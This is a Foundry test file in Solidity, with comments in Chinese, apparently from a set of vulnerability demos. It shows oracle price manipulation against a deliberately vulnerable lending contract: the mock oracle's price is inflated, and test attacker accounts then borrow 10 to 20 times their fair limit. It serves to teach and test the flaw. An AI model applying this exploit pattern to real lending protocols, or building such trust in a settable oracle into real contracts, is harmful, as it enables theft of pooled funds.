// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../../src/vulns/D22_SimpleERC20.sol";
import "../../src/vulns/D22_MockOracle.sol";
import "../../src/vulns/D22_VulnerableLending.sol";

contract D22_OracleManipulation_Test is Test {
    D22_SimpleERC20 col;
    D22_SimpleERC20 debt;
    D22_MockOracle oracle;
    D22_VulnerableLending lending;

    address attacker1 = address(0xA001);
    address attacker2 = address(0xA002);

    uint256 constant WAD = 1e18;

    function setUp() public {
        col = new D22_SimpleERC20("Collateral", "COL");
        debt = new D22_SimpleERC20("Debt", "DEBT");

        // 初始价格：1 COL = 100 DEBT
        oracle = new D22_MockOracle(100 * WAD);

        // LTV 50%
        lending = new D22_VulnerableLending(col, debt, oracle, 0.5e18);

        // 给借贷池注入可借出的 DEBT 流动性
        debt.mint(address(lending), 1_000_000 * WAD);

        // 给攻击者准备抵押物 COL
        col.mint(attacker1, 10 * WAD);
        col.mint(attacker2, 10 * WAD);
    }

    function _deposit(address user, uint256 amount) internal {
        vm.startPrank(user);
        col.approve(address(lending), type(uint256).max);
        lending.depositCollateral(amount);
        vm.stopPrank();
    }

    function test_oracleManipulation_borrowMoreThanFairValue() public {
        uint256 depositAmt = 1 * WAD;

        // ============ 1) 操纵前：正常价借款 ============
        _deposit(attacker1, depositAmt);

        uint256 maxNormal = lending.maxBorrow(attacker1);
        // 正常价：1 COL=100 DEBT，LTV 50% => max = 50 DEBT
        assertEq(maxNormal, 50 * WAD);

        uint256 balBefore1 = debt.balanceOf(attacker1);
        vm.prank(attacker1);
        lending.borrow(maxNormal);
        uint256 balAfter1 = debt.balanceOf(attacker1);

        // “操纵前资产变化”断言
        assertEq(balAfter1 - balBefore1, maxNormal);
        assertEq(lending.debtOf(attacker1), maxNormal);

        // ============ 2) 操纵后：抬高价格再借 ============
        // 把价格抬高 10 倍：1 COL = 1000 DEBT
        oracle.setPrice(1000 * WAD);

        _deposit(attacker2, depositAmt);

        uint256 maxManipulated = lending.maxBorrow(attacker2);
        // 10 倍价格 => max 也 10 倍：500 DEBT
        assertEq(maxManipulated, 500 * WAD);
        assertGt(maxManipulated, maxNormal);

        uint256 balBefore2 = debt.balanceOf(attacker2);
        vm.prank(attacker2);
        lending.borrow(maxManipulated);
        uint256 balAfter2 = debt.balanceOf(attacker2);

        // “操纵后资产变化”断言
        assertEq(balAfter2 - balBefore2, maxManipulated);
        assertEq(lending.debtOf(attacker2), maxManipulated);

        // ============ 3) 用“公平价格”证明借超了 ============
        // 假设公平价仍应为 1 COL=100 DEBT
        uint256 fairPrice = 100 * WAD;
        uint256 fairValueInDebt = (depositAmt * fairPrice) / WAD; // 100 DEBT
        uint256 fairMaxBorrow = (fairValueInDebt * 0.5e18) / WAD; // 50 DEBT

        // 攻击者借到了 500，明显超过公平上限 50
        assertGt(lending.debtOf(attacker2), fairMaxBorrow);

        // 额外对照：操纵后比操纵前多借了 450
        assertEq(
            lending.debtOf(attacker2) - lending.debtOf(attacker1),
            450 * WAD
        );
    }

    // 这个用例展示“同一个人先存抵押，再拉价，再借更多”
    function test_oracleManipulation_canExceedMaxIfPriceInflated_midway()
        public
    {
        uint256 depositAmt = 1 * WAD;

        _deposit(attacker1, depositAmt);

        uint256 maxNormal = lending.maxBorrow(attacker1);
        assertEq(maxNormal, 50 * WAD);

        // 先不借，直接抬价
        oracle.setPrice(2000 * WAD); // 20 倍

        uint256 maxAfter = lending.maxBorrow(attacker1);
        assertEq(maxAfter, 1000 * WAD);

        // 在漏洞合约里：允许直接借到更高额度
        vm.prank(attacker1);
        lending.borrow(maxAfter);

        assertEq(lending.debtOf(attacker1), maxAfter);
    }
}
